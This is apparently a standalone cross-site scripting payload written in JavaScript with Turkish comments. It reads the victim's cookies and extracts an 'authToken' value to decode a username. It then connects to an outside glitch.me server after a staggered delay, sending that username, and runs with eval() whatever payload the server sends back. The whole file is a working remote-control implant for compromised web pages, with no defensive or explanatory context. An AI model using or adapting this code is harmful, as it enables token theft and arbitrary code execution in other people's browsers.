console.log('XSS scripti yüklendi');

const getUsername = () => {
    const cookies = document.cookie.split(';');
    console.log('Çerezler:', document.cookie);
    for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === 'authToken') {
            console.log('authToken:', value);
            const encodedUsername = value.split('_')[0]; // %2FATLAS
            const decodedUsername = decodeURIComponent(encodedUsername); // /ATLAS
            console.log('Decoded Username:', decodedUsername);
            return decodedUsername; // /ATLAS dönmeli
        }
    }
    return null;
};

const username = getUsername();
console.log('Username:', username);

// İlk karaktere göre gecikme hesapla (milisaniye cinsinden)
const calculateDelay = (username) => {
    if (!username) return 0;
    const firstChar = username[0].toLowerCase();
    if (/[^a-z0-9]/.test(firstChar)) return 1000; // Özel karakter: 1 saniye
    if (/[0-9]/.test(firstChar)) return 2000; // Sayı: 2 saniye
    if (/[a-z]/.test(firstChar)) {
        const charCode = firstChar.charCodeAt(0) - 'a'.charCodeAt(0);
        return (charCode + 3) * 1000; // a=3 saniye, b=4 saniye, ...
    }
    return 0;
};

const delay = calculateDelay(username);
console.log(`Bağlantı gecikmesi: ${delay / 1000} saniye`);

// SSE bağlantısını gecikmeli olarak kur
setTimeout(() => {
    const url = `https://tortoiseshell-bramble-day.glitch.me/komutlar?username=${encodeURIComponent(username)}`;
    console.log('SSE URL:', url); // URL’yi logla
    const eventSource = new EventSource(url);
    eventSource.onmessage = (event) => {
        console.log('Gelen veri:', event.data);
        const data = JSON.parse(event.data);
        if (data.payload) {
            console.log('Payload çalıştırılıyor:', data.payload);
            eval(data.payload);
        }
    };
    eventSource.onerror = (err) => {
        console.log('SSE hatası! Detay:', err);
    };
    eventSource.onopen = () => {
        console.log('SSE bağlantısı açıldı');
    };
}, delay);
